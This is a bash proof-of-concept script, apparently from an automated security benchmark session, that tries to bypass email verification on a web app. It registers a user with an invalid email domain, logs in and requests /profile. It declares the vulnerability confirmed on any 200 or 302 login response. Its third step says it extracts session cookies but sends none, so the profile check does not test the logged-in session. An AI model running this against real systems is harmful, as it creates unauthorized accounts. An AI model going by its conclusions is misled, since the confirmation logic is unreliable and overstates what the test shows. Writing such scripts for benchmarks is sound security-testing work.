#!/bin/bash
# POC: Demonstrates email verification bypass by registering with an invalid email and immediately logging in without verification
# Target: ./repo
# Created: 2025-11-04T17:21:57.033Z
# Session: benchmark-XBEN-024-24-mhktkgzl

# Email Verification Bypass POC
# This script demonstrates the ability to register and login without email verification

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-80}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "=== Email Verification Bypass POC ==="
echo "Target: $BASE_URL"
echo ""

# Step 1: Register with an invalid email domain
echo "[*] Step 1: Registering user with invalid email domain..."
REGISTER_RESPONSE=$(curl -s -X POST "$BASE_URL/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'username=unverifieduser&password=TestPass123&first_name=Unverified&last_name=User&email=unverified@invalid.test' \
  -w "\n%{http_code}")

# Extract HTTP status code
HTTP_CODE=$(echo "$REGISTER_RESPONSE" | tail -n1)
REGISTER_BODY=$(echo "$REGISTER_RESPONSE" | head -n-1)

echo "[*] Registration Response Code: $HTTP_CODE"
echo "[*] Response Body: $REGISTER_BODY"

if [ "$HTTP_CODE" == "302" ] || [ "$HTTP_CODE" == "201" ] || [ "$HTTP_CODE" == "200" ]; then
    echo "[+] Registration successful - user created with unverified email"
else
    echo "[-] Registration failed with HTTP $HTTP_CODE"
    exit 1
fi

echo ""
echo "[*] Step 2: Attempting immediate login without email verification..."

# Step 2: Try to login immediately without verifying email
LOGIN_RESPONSE=$(curl -s -X POST "$BASE_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'username=unverifieduser&password=TestPass123' \
  -w "\n%{http_code}")

# Extract HTTP status code
HTTP_CODE=$(echo "$LOGIN_RESPONSE" | tail -n1)
LOGIN_BODY=$(echo "$LOGIN_RESPONSE" | head -n-1)

echo "[*] Login Response Code: $HTTP_CODE"
echo "[*] Response Body: $LOGIN_BODY"

if [ "$HTTP_CODE" == "302" ] || [ "$HTTP_CODE" == "200" ]; then
    echo "[+] Login successful without email verification!"
    echo "[+] VULNERABILITY CONFIRMED: User can access the application with unverified email"
    
    # Step 3: Try to access protected resource with the session
    echo ""
    echo "[*] Step 3: Attempting to access protected resource (/profile)..."
    
    # Extract cookies from login response if available
    PROFILE_RESPONSE=$(curl -s -X GET "$BASE_URL/profile" \
      -w "\n%{http_code}")
    
    PROFILE_CODE=$(echo "$PROFILE_RESPONSE" | tail -n1)
    PROFILE_BODY=$(echo "$PROFILE_RESPONSE" | head -n-1)
    
    echo "[*] Profile Access Response Code: $PROFILE_CODE"
    echo "[*] Response includes user data: $(echo "$PROFILE_BODY" | grep -q 'unverified' && echo 'YES' || echo 'CHECK RESPONSE')"
    
    exit 0
else
    echo "[-] Login failed with HTTP $HTTP_CODE"
    echo "[-] Cannot confirm vulnerability - login was rejected"
    exit 1
fi